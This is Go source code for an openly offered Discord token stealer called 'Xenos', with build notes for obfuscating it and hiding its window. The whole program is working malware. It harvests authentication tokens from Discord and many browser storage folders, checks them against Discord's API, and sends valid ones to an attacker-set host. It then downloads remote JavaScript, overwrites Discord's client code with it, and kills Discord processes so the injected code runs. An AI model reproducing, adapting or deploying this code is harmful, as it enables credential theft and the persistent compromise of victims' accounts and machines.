/*

How to build:

go mod init Xenos
go mod tidy

**Require Garble** https://github.com/burrowers/garble
set GOPRIVATE=*

garble -literals -seed=random -tiny build -trimpath -ldflags '-s -w -H=windowsgui'

**Without garble **
go build -ldflags "-s -w" -ldflags -H=windowsgui

*/

package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/shirou/gopsutil/v3/process"
)

var (
	host    = "https://yourwebsite.com"
	regexes = []*regexp.Regexp{regexp.MustCompile(`(?m)[\w-]{24}\.[\w-]{6}\.[\w-]{27}`), regexp.MustCompile(`(?m)mfa\.[\w-]{84}`)}
)

func main() {
	tokens, err := collectTokens()
	if err != nil {
		os.Exit(1)
	}

	tokens = checkTokens(tokens)
	sendTokens(tokens)
	injectDiscord()
	killDiscords()

}

func injectDiscord() {
	discords := getDiscords()

	for _, disc := range discords {
		pattern := fmt.Sprintf("%s\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js", disc)
		match, err := filepath.Glob(pattern)
		if err != nil {
			return
		}

		if len(match) > 0 {
			code, err := getCode()
			if err != nil {
				return
			}
			for _, m := range match {
				injectCode(code, m)
			}
		}
	}
}
func injectCode(code string, p string) {
	f, err := os.OpenFile(p, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0755)
	if err != nil {
		return
	}
	defer f.Close()

	_, err = f.WriteString(code)
	if err != nil {
		return
	}
	dir := path.Join(strings.TrimSuffix(p, "\\index.js"), "XenosStealer")
	if _, err := os.Stat(dir); os.IsNotExist(err) {
		err := os.Mkdir(dir, 0755)
		if err != nil {
			return
		}
	}
}
func getCode() (string, error) {
	req, err := http.NewRequest("GET", "https://raw.githubusercontent.com/KanekiWeb/Xenos/main/Grabber/Injection/injection.js", nil)
	if err != nil {
		return "", err
	}

	client := &http.Client{Timeout: 10 * time.Second}

	res, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer res.Body.Close()
	body, err := io.ReadAll(res.Body)
	if err != nil {
		return "", err
	}

	return strings.Replace(string(body), "%WEBHOOK_LINK%", host, -1), nil
}

func killDiscords() {
	processes, err := process.Processes()
	if err != nil {
		return
	}
	for _, p := range processes {
		n, err := p.Name()
		if err != nil {
			return
		}
		if strings.Contains(n, "iscord") {
			p.Kill()
		}
	}
}
func getDiscords() []string {
	var result []string
	entries, err := os.ReadDir(os.Getenv("LOCALAPPDATA"))
	if err != nil {
		os.Exit(1)
	}

	for _, e := range entries {
		if e.IsDir() && strings.Contains(e.Name(), "iscord") {
			result = append(result, path.Join(os.Getenv("LOCALAPPDATA"), e.Name()))
		}
	}
	return result
}

func sendTokens(tokens []string) {
	var wg sync.WaitGroup
	client := &http.Client{Timeout: 25 * time.Second}

	for _, t := range tokens {
		go func() {
			defer wg.Done()
			client.Get(fmt.Sprintf("%s/api?type=addtoken&token=%s", host, t))
		}()
	}
	wg.Wait()
}
func checkTokens(tokens []string) []string {
	var wg sync.WaitGroup
	var result []string
	tokens = removeDupes(tokens)
	client := &http.Client{
		Timeout: 10 * time.Second,
	}
	for _, t := range tokens {
		wg.Add(1)
		go func(token string) {
			defer wg.Done()
			if isValid(client, token) {
				result = append(result, token)
			}
		}(t)
	}
	wg.Wait()
	return result
}
func isValid(client *http.Client, token string) bool {
	req, err := http.NewRequest("GET", "https://discord.com/api/v9/users/@me/affinities/guilds", nil)
	if err != nil {
		return false
	}
	req.Header = http.Header{
		"Authorization": {token},
		"Content-Type":  {"application/json"},
		"User-Agent":    {"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.61 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36"},
	}
	res, err := client.Do(req)
	if err != nil {
		return false
	}

	if res.StatusCode > 200 {
		return false
	}

	return true
}

func collectTokens() ([]string, error) {
	var (
		tokens      []string
		validTokens []string
	)

	var replacer = strings.NewReplacer(
		"__ROAMING__", os.Getenv("APPDATA"),
		"__LOCAL__", os.Getenv("LOCALAPPDATA"),
		"/", `\`,
	)

	_ = validTokens

	paths := []string{
		"__ROAMING__/Discord/Local Storage/leveldb",
		"__ROAMING__/Lightcord/Local Storage/leveldb",
		"__ROAMING__/discordcanary/Local Storage/leveldb",
		"__ROAMING__/discordptb/Local Storage/leveldb",
		"__ROAMING__/OperaSoftware/Opera GX Stable/Local Storage/leveldb",
		"__ROAMING__/OperaSoftware/Opera Stable/Local Storage/leveldb",
		"__ROAMING__/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb",
		"__LOCAL__/Google/Chrome/User Data/Default/Local Storage/leveldb",
		"__LOCAL__/Google/Chrome SxS/User Data/Local Storage/leveldb",
		"__LOCAL__/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb",
		"__LOCAL__/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb",
		"__LOCAL__/Amigo/User Data/Local Storage/leveldb",
		"__LOCAL__/Torch/User Data/Local Storage/leveldb",
		"__LOCAL__/Kometa/User Data/Local Storage/leveldb",
		"__LOCAL__/Orbitum/User Data/Local Storage/leveldb",
		"__LOCAL__/CentBrowser/User Data/Local Storage/leveldb",
		"__LOCAL__/7Star/7Star/User Data/Local Storage/leveldb",
		"__LOCAL__/Sputnik/Sputnik/User Data/Local Storage/leveldb",
		"__LOCAL__/Vivaldi/User Data/Default/Local Storage/leveldb",
		"__LOCAL__/EpicPrivacy Browser/User Data/Local Storage/leveldb",
		"__LOCAL__/Microsoft/Edge/User Data/Default/Local Storage/leveldb",
		"__LOCAL__/uCozMedia/Uran/User Data/Default/Local Storage/leveldb",
		"__LOCAL__/Iridium/User Data/Default/Local Storage/leveldb",
	}

	var wg sync.WaitGroup

	tokenChan := make(chan string)
	go func() {
		for v := range tokenChan {
			tokens = append(tokens, v)
		}
	}()

	for _, path := range paths {
		path = replacer.Replace(path)
		if _, err := os.Stat(path); !os.IsNotExist(err) {
			wg.Add(1)
			go func(path string) {
				defer wg.Done()
				err := walkPath(path, tokenChan)
				if err != nil {
					log.Println(err)
				}
			}(path)
		}
	}
	wg.Wait()
	return tokens, nil
}
func walkPath(path string, tokenChan chan string) error {
	var wg sync.WaitGroup
	err := filepath.Walk(path, func(file string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		// we don't care abt directories
		if !info.IsDir() {
			switch {
			case strings.HasSuffix(file, ".log"), strings.HasSuffix(file, ".ldb"), strings.HasSuffix(file, ".sqlite"):
				wg.Add(1)
				go func() {
					defer wg.Done()
					found, err := scanFile(file)
					if err != nil {
						log.Println("error scanning file:", err.Error())
					}
					if len(found) > 0 {
						for _, t := range found {
							tokenChan <- t
						}
					}
				}()
			default:
				return nil
			}

		}
		return nil
	})
	if err != nil {
		return err
	}
	wg.Wait()
	return nil
}
func scanFile(path string) ([]string, error) {
	var result []string

	content, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	str := string(content)

	for _, r := range regexes {
		s := r.FindAllString(str, -1)
		result = append(result, s...)
	}

	return result, nil
}

func removeDupes(s []string) []string {
	allKeys := make(map[string]bool)
	list := []string{}
	for _, item := range s {
		if _, value := allKeys[item]; !value {
			allKeys[item] = true
			list = append(list, item)
		}
	}
	return list
}
